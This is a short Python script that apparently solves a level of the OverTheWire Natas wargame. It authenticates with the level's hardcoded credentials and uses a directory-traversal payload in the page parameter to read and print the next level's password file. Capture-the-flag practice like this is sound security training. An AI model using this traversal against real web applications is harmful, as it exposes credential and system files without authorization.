import requests

url = 'http://natas7.natas.labs.overthewire.org'
s = requests.Session()
s.auth = ('natas7', 'bmg8SvU1LizuWjx3y7xkNERkHxGre0GS')
url += '/index.php?page=../../../../../etc/natas_webpass/natas8'
r = s.get(url)
print(r.text)
